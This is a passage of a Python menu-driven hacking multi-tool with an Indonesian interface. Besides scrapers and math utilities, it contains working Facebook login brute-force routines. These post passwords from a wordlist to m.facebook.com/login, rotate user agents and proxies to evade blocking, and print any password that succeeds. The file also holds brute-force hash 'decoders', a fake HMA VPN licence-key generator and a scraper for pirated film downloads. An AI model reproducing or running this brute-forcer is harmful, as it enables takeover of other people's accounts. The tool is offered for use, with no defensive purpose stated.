        
        if generateHashFromString(hashMethod, formatted_string)  == stringToBeCracked:
            print(C+' String '+R+'>'+W+' {}'.format(formatted_string))
            main()

def desha256():
    hashMethod = 'sha256'
    stringToBeCracked = str(input(C+' Input Hash '+R+'> '+W))
    generated_string = []
    
    while True:
        generated_string = StringGenerator(generated_string)
        formatted_string = reverseString(''.join(generated_string))
        
        if generateHashFromString(hashMethod, formatted_string)  == stringToBeCracked:
            print(C+' String '+R+'>'+W+' {}'.format(formatted_string))
            main()

def desha384():
    hashMethod = 'sha384'
    stringToBeCracked = str(input(C+' Input Hash '+R+'> '+W))
    generated_string = []
    
    while True:
        generated_string = StringGenerator(generated_string)
        formatted_string = reverseString(''.join(generated_string))
        
        if generateHashFromString(hashMethod, formatted_string)  == stringToBeCracked:
            print(C+' String '+R+'>'+W+' {}'.format(formatted_string))
            main()

def desha512():
    hashMethod = 'sha512'
    stringToBeCracked = str(input(C+' Input Hash '+R+'> '+W))
    generated_string = []
    
    while True:
        generated_string = StringGenerator(generated_string)
        formatted_string = reverseString(''.join(generated_string))
        
        if generateHashFromString(hashMethod, formatted_string)  == stringToBeCracked:
            print(C+' String '+R+'>'+W+' {}'.format(formatted_string))
            main()

def brainly():
    bannerbr()
    a = input(C+' Pertanyaan '+R+'> '+W)
    payload = {"query":a}
    url = "https://brainly.co.id/api/28/api_tasks/suggester"
    scrap = json.loads(requests.get(url, params=payload).text)
    try:
       os.system('clear')
       qtion = scrap['data']['tasks']['items'][0]['task']['content']
       qtion = qtion.replace("<br />","\n").replace("<span>","").replace("</span>","")
       bannerbr()
       print (C+' ['+W+' PERTANYAAN '+C+']\n\n'+W+' ',qtion)
    except:
        bannerbr()
        print (C+' ['+W+' 404 '+C+']'+R+' >'+W+' Soal tidak dapat ditemukan')
        print ('')
        exit()
    try:
        for x in range(100):
            ans = scrap['data']['tasks']['items'][0]['responses'][x]['content']
            ans = ans.replace("<br />","\n").replace("<span>","").replace("</span>","")
            print ('')
            print (C+' [ '+W+'Jawaban ' + str(x+1) + C+' ]\n\n'+W + ans)
    except:
        print ('')
        print (C+' [ '+W+'Hanya dapat mengambil'+C+' ]'+R+' > '+W+ str(x) +' Jawaban')
        print ('')

def lk21():
    bannerlk()
    a = input(C+' Judul '+R+'> '+W)
    payload = {"s":a}
    req = requests.get("https://dunia21.me/", params=payload).text
    soup = BeautifulSoup(req, "html.parser")
    linknya = soup.find_all('h2')
    link = linknya[2]
    judul = re.search(r'<a href="https://dunia21.me/(.*)/" rel="bookmark"', str(link)).group(1)
    try:
        bannerlk_dl()
        print (C+' ['+W+' JUDUL '+C+']'+R+' >'+W+' ',str(judul))
        print ('')
        dload = "https://dl.layarkaca21.vip/get/" + judul
        bpass = "https://dl.layarkaca21.vip/verifying.php"
        data = {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
                "Accept":"*/*",
                "X-Requested-With":"XMLHttpRequest"}
        payload2 = {"slug":judul}
        req2 = requests.post(bpass, headers=data, params=payload2).text
        soup2 = BeautifulSoup(req2, "html.parser")
        linkdownload = soup2.find_all('a')
        p360 = re.findall(r'btn-360" href="(.*)" rel=', str(linkdownload))
        if len(p360) > 0:
            for laz1 in p360:
                print(C+' ['+W+' 360 P '+C+']'+R+' >'+W+' ',laz1)
        p480 = re.findall(r'btn-480" href="(.*)" rel=', str(linkdownload))
        if len(p480) > 0:
            for laz2 in p480:
                print(C+' ['+W+' 480 P '+C+']'+R+' >'+W+' ',laz2)
        p720 = re.findall(r'btn-720" href="(.*)" rel=', str(linkdownload))
        if len(p720) > 0:
            for laz3 in p720:
                print(C+' ['+W+' 720 P '+C+']'+R+' >'+W+' ',laz3)
        p1080 = re.findall(r'btn-1080" href="(.*)" rel=', str(linkdownload))
        if len(p1080) > 0:
            for laz4 in p1080:
                print(C+' ['+W+' 1080P '+C+']'+R+' >'+W+' ',laz4)
    except:
        print (C+' ['+W+' 404 '+C+']'+R+' >'+W+' Film tidak ditemukan')
    print ('')

def singlefbbrute():
    URL = 'https://m.facebook.com/login'
    print ('')
    email = input(C+' Username '+R+'> '+W)
    wlist = input(C+' Wordlist '+R+'> '+W)
    print ('')
    passwd = open(wlist, 'r')
    for password in passwd:
        form_data = {
            'email' : email,
            'pass' : password
        }
        user_agent = random.choice(ua)
        headers = {'User-Agent': user_agent}
        proxies_a = random.choice(prox)
        proxies = {'http': proxies_a}
        with requests.Session() as c:
            c.get(URL, headers=headers, proxies=proxies)
            r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
            b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
            soup = BeautifulSoup(b.content, 'html.parser')
            a = soup.find('title')
            if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
                print(C+' ['+R+' ERROR '+C+']'+R+' > '+W+password,end='', flush=True)
            elif(str(a) == '<title>Facebook</title>'):
                print(C+' ['+G+' OK '+C+']'+R+' > '+W+password,end='', flush=True)
                print ('')
                print ('')
                print(C+' ['+W+' Result '+C+']'+R+' > '+G+'Success')
                print(C+' ['+W+' Password '+C+']'+R+' > '+W+password)
                main()

def multifbbrute():
    URL = 'https://m.facebook.com/login'
    print ('')
    username = input(C+' Userlist '+R+'> '+W)
    password = input(C+' Password '+R+'> '+W)
    print ('')
    uname = open(username, 'r')
    for email in uname:
        form_data = {
            'email' : email,
            'pass' : password
        }
        user_agent = random.choice(ua)
        headers = {'User-Agent': user_agent}
        proxies_a = random.choice(prox)
        proxies = {'http': proxies_a}
        with requests.Session() as c:
            c.get(URL, headers=headers, proxies=proxies)
            r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
            b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
            soup = BeautifulSoup(b.content, 'html.parser')
            a = soup.find('title')
            if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
                print(C+' ['+R+' ERROR '+C+']'+R+' > '+W+email,end='', flush=True)
            if(str(a) == '<title>Facebook</title>'):
                print(C+' ['+G+' OK '+C+']'+R+' > '+W+email,end='', flush=True)

def multibrute():
    URL = 'https://m.facebook.com/login'
    print ('')
    username = input(C+' Userlist '+R+'> '+W)
    passwd = input(C+' Wordlist '+R+'> '+W)
    print ('')
    uname = open(username, 'r')
    for email in uname:
        print(C+' ['+O+' USER '+C+']'+R+' > '+W+email)
        passw = open(passwd, 'r')
        for password in passw:
            form_data = {
                'email' : email,
                'pass' : password
            }
            user_agent = random.choice(ua)
            headers = {'User-Agent': user_agent}
            proxies_a = random.choice(prox)
            proxies = {'http': proxies_a}
            with requests.Session() as c:
                c.get(URL, headers=headers, proxies=proxies)
                r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
                b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
                soup = BeautifulSoup(b.content, 'html.parser')
                a = soup.find('title')
                if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
                    print(C+' ['+R+' ERROR '+C+']'+R+' > '+W+password,end='', flush=True)
                if(str(a) == '<title>Facebook</title>'):
                    print(C+' ['+G+' OK '+C+']'+R+' > '+W+password,end='', flush=True)
        print ('')

def hma() :
    total = int(input(C+' Total '+R+'> '+W))
    def rand(chars=string.ascii_uppercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(6))
    for i in range(total):
        asd = rand()
        print (' '+asd+'-'+asd+'-'+asd)


def custgen() :
    pil = str(input(C+' Input Base (y/n) ? '+R+'> '+W))
    if pil == 'n' or pil == 'N' :
        size = int(input(C+' Jumlah digit kode '+R+'> '+W))
        case = str(input(C+' UPPER/lower (U/l) ? '+R+'> '+W))
        total = int(input(C+' Total kode '+R+'> '+W))
        if case == 'u' or case == 'U' :
            def rand(chars=string.ascii_uppercase + string.digits):
                return ''.join(random.choice(chars) for _ in range(size))
            for i in range(total):
                print (' '+rand())
        elif case == 'l' or case == 'L' :
            def rand(chars=string.ascii_lowercase + string.digits):
                return ''.join(random.choice(chars) for _ in range(size))
            for i in range(total):
                print (' '+rand())
    elif pil == 'y' or pil == 'Y' :
        base = str(input(C+' Base '+R+'> '+W))
        size = int(input(C+' Jumlah digit kode '+R+'> '+W))
        case = str(input(C+' UPPER/lower (U/l) ? '+R+'> '+W))
        total = int(input(C+' Total kode '+R+'> '+W))
        if case == 'u' or case == 'U' :
            def rand(chars=string.ascii_uppercase + string.digits):
                return ''.join(random.choice(chars) for _ in range(size-len(base)))
            for i in range(total):
                print (' '+base+rand())
        elif case == 'l' or case == 'L' :
            def rand(chars=string.ascii_lowercase + string.digits):
                return ''.join(random.choice(chars) for _ in range(size-len(base)))
            for i in range(total):
                print (' '+base+rand())

def apkpure():
      global link,nm,linkfile,size
      no =0
      link =[]
      judul=[]
      developer=[]
      bannerapk()
      print ('')
      sc = input(C+' Aplikasi '+R+'> '+W)
      print ('')
      bannerapk()
      req = Request('https://m.apkpure.com/id/search?q='+sc.replace(' ','+'), headers={'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi Note 5A MIUI/V9.6.2.0.NDFMIFD'})
      req = urlopen(req).read()
      sup = BeautifulSoup(req,'html.parser')
      for li in sup.find_all('a',attrs={'class':'dd'}):
            l = li.get('href')
            link.append(l)
      for i in sup.find_all('div',attrs={'class':'r'}):
            title = i.find('p',attrs={'class':'p1'})
            peng = i.find('p',attrs={'class':'p2'})
            judul.append(title.get_text())
            developer.append(peng.get_text())
      for ju,de in zip(judul,developer):
            no+=1 
            print ('')
            print (C+' ['+W, no ,C+']')
            print(C+' ['+W+' Nama Aplikasi '+C+']'+R+' >'+W+' '+ju)
            print(C+' ['+W+' Developer '+C+']'+R+' >'+W+' '+de)
            print ('')

      print(C+' ['+W+' Aplikasi ditemukan '+C+']'+R+' >'+W+' '+str(len(link)))
      print ('')
      do = int(input(C+' Input Nomor '+R+'> '+W))
      do = do - 1    
      nm = input(C+' Output '+R+'> '+W)
      print ('')
      print(C+' ['+W+' Output '+C+']'+R+' >'+W+' '+nm+'.apk')
      linx='https://m.apkpure.com'+str(link[do])+'/download?from=details'
      r = Request(linx,headers={'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi Note 5A MIUI/V9.6.2.0.NDFMIFD'})
      r = urlopen(r).read()
      sp = BeautifulSoup(r,'html.parser')
      donl = sp.find('div',attrs={'class':'fast-download-box'})
      don = donl.find('a',attrs={'class':'ga'})
      size = donl.find('span',attrs={'class':'fsize'})
      linkfile = don.get('href')
      trd = threading.Thread(name='Donloder',target=donlot)
      trd.start()
      bannerapk()
      while trd.isAlive():
          animasi()

def apkdl():
      global link1,nm,linkfile,size
      no =0
      link1 =[]
      judul1=[]
      developer1=[]
      bannerapk()
      print ('')
      sc = input(C+' Aplikasi '+R+'> '+W)
      print ('')
      bannerapk()
      req = Request('https://apk-dl.com/search?q='+sc.replace(' ','%20'), headers={'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi Note 5A MIUI/V9.6.2.0.NDFMIFD'})
      req = urlopen(req).read()
      sup = BeautifulSoup(req,'html.parser')
      for div in sup.find_all('div',class_='card no-rationale square-cover apps small'):
            di = div.find('div', class_='details')
            des = di.find('a', class_='title')
            link1.append(des.get('href'))
            judul1.append(des.text)
            dev = di.find('div',class_='subtitle-container')
            dev = dev.find('a')
            developer1.append(dev.text)
      for ju,de in zip(judul1,developer1):
            no+=1 
            print ('')
            print (C+' ['+W, no ,C+']')
            print(C+' ['+W+' Nama Aplikasi '+C+']'+R+' >'+W+' '+ju)
            print(C+' ['+W+' Developer '+C+']'+R+' >'+W+' '+de)
            print ('')
      print(C+' ['+W+' Aplikasi ditemukan '+C+']'+R+' >'+W+' '+str(len(link1)))
      print ('')
      do = int(input(C+' Input Nomor '+R+'> '+W))
      do = do - 1    
      nm = input(C+' Output '+R+'> '+W)
      print ('')
      print(C+' ['+W+' Output '+C+']'+R+' >'+W+' '+nm+'.apk')
      linx='https://apk-dl.com/'+str(link1[do])
      r = Request(linx,headers={'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi Note 5A MIUI/V9.6.2.0.NDFMIFD'})
      r = urlopen(r).read()
      sp = BeautifulSoup(r,'html.parser')
      donl = sp.find('div',class_='download-btn')
      donll = donl.find('a')
      lindonl = donll.get('href')
      rq = Request('http://apkfind.com'+lindonl,headers={'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi Note 5A MIUI/V9.6.2.0.NDFMIFD'})
      rq = urlopen(rq).read()
      spq = BeautifulSoup(rq,'html.parser')
      downn =spq.find('div',class_='container-content')
      donn = downn.find('a')#, class_='mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect fixed-size')
      rj = Request(donn.get('href'),headers={'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi Note 5A MIUI/V9.6.2.0.NDFMIFD'})
      rj = urlopen(rj).read()
      spr = BeautifulSoup(rj,'html.parser')
      downnn =spr.find('div',class_='container-content')
      donnn = downnn.find('a')#, class_='mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect fixed-size')
      linkfile='http:'+donnn.get('href')
      trd = threading.Thread(name='Donloder',target=donlot)
      trd.start()
      bannerapk()
      while trd.isAlive():
          animasi()

def donlot():
      try:
            os.mkdir('Hasil')
      except OSError:
            pass
      req = requests.get(linkfile, headers={'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi Note 5A MIUI/V9.6.2.0.NDFMIFD'})
      with open('Hasil/'+nm+'.apk','wb') as dl:
            dl.write(req.content)

def animasi():
      zz = ['     ',' >   ',' >>  ',' >>> ']
      for i in zz:
          xx = ['/','-','\\','|']
          for o in xx:
              print (C+'\r [ '+R+o+C+' ] '+W+'Downloading'+C+' [ '+O+i+C+' ] '+W+nm+'.apk',end=''),;sys.stdout.flush();time.sleep(0.1)

def fbbrute():
    bannerfb()
    fbmenu()

def fbmenu():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Brute Single Target with Wordlist')
    print (C+' 02'+R+'  :'+W+'  Brute Multiple Target with Single Password')
    print (C+' 03'+R+'  :'+W+'  Brute Multiple Target with Wordlist')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Brute/Facebook'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        singlefbbrute()
    elif cmd == '02' or cmd == '2' :
        multifbbrute()
    elif cmd == '03' or cmd == '3' :
        multibrute()
    elif cmd == '00' or cmd == '0' :
        banner()
        brute()
    elif cmd == '99' :
        exit()
    else :
        fbbrute()


def apk():
    bannerapk()
    apkmenu()

def apkmenu():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Download APK from APKpure.com')
    print (C+' 02'+R+'  :'+W+'  Download APK from Apk-dl.com')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Apk'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        apkpure()
    elif cmd == '02' or cmd == '2' :
        apkdl()
    elif cmd == '00' or cmd == '0' :
        banner()
        menu()
    elif cmd == '99' :
        exit()
    else :
        apk()

def betaprogram():
    print ('')
    print (O+' COMINGSOON !!'+W)
    print ('')

def gen():
    print ('')
    print (C+' 01'+R+'  :'+W+'  HMA License key Generator')
    print (C+' 02'+R+'  :'+W+'  Custom Code Generator')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Generate'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        hma()
    elif cmd == '02' or cmd == '2' :
        banner()
        custgen()
    elif cmd == '00' or cmd == '0' :
        banner()
        menu()
    elif cmd == '99' :
        exit()
    else :
        banner()
        gen()

def crypto():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Decode MD5')
    print (C+' 02'+R+'  :'+W+'  Decode SHA1')
    print (C+' 03'+R+'  :'+W+'  Decode SHA224')
    print (C+' 04'+R+'  :'+W+'  Decode SHA256')
    print (C+' 05'+R+'  :'+W+'  Decode SHA384')
    print (C+' 06'+R+'  :'+W+'  Decode SHA512')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Crypto'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        demd5()
    elif cmd == '02' or cmd == '2' :
        banner()
        desha1()
    elif cmd == '03' or cmd == '3' :
        banner()
        desha224()
    elif cmd == '04' or cmd == '4' :
        banner()
        desha256()
    elif cmd == '05' or cmd == '5' :
        banner()
        desha384()
    elif cmd == '06' or cmd == '6' :
        banner()
        desha512()
    elif cmd == '00' or cmd == '0' :
        banner()
        menu()
    elif cmd == '99' :
        exit()
    else :
        banner()
        crypto()

def brute():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Facebook Bruteforce')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Brute'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        fbbrute()
    elif cmd == '00' or cmd == '0' :
        banner()
        menu()
    elif cmd == '99' :
        exit()
    else :
        banner()
        brute()

def mathtool():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Bangun Datar')
    print (C+' 02'+R+'  :'+W+'  Bangun Ruang')
    print (C+' 03'+R+'  :'+W+'  Bilangan Prima')
    print (C+' 04'+R+'  :'+W+'  Faktor Bilangan')
    print (C+' 05'+R+'  :'+W+'  Mean / Median / Modus')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        pilbangundatar()
    elif cmd == '02' or cmd == '2' :
        banner()
        pilbangunruang()
    elif cmd == '03' or cmd == '3' :
        banner()
        prima()
    elif cmd == '04' or cmd == '4' :
        banner()
        faktor()
    elif cmd == '05' or cmd == '5' :
        banner()
        medus()
    elif cmd == '00' or cmd == '0' :
        banner()
        menu()
    elif cmd == '99' :
        exit()
    else :
        banner()
        mathtool()

def menu():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Math Tool')
    print (C+' 02'+R+'  :'+W+'  Physics Tool')
    print (C+' 03'+R+'  :'+W+'  Crypto Tool')
    print (C+' 04'+R+'  :'+W+'  Brainly Seeker')
    print (C+' 05'+R+'  :'+W+'  Bruteforce Tool')
    print (C+' 06'+R+'  :'+W+'  LK21 Bypass Shortlink')
    print (C+' 07'+R+'  :'+W+'  APK Downloader')
    print (C+' 08'+R+'  :'+W+'  Generator')
    print ('')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        mathtool()
    elif cmd == '02' or cmd == '2' :
        banner()
        betaprogram()
    elif cmd == '03' or cmd == '3' :
        banner()
        crypto()
    elif cmd == '04' or cmd == '4' :
        brainly()
    elif cmd == '05' or cmd == '5' :
        banner()
        brute()
    elif cmd == '06' or cmd == '6' :
        lk21()
    elif cmd == '07' or cmd == '7' :
        apk()
    elif cmd == '08' or cmd == '8' :
        banner()
        gen()
    elif cmd == '99' :
        exit()
    else :
        banner()
        menu()

banner()
menu()
